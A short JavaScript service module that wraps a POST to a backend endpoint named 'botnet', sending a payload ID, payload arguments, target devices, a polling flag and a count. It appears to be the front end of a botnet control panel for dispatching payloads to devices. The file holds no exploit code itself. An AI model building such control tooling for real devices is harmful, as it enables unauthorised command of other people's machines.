import Api from '@/services/Api'

export default {
    activate (device, payload_id, arg, polling, num) {
        let data = {
            payload_id: payload_id,
            devices: device,
            payload_args: arg,
            polling: polling,
            num: num
        };
        return Api.backend().post('botnet', data)
    }
}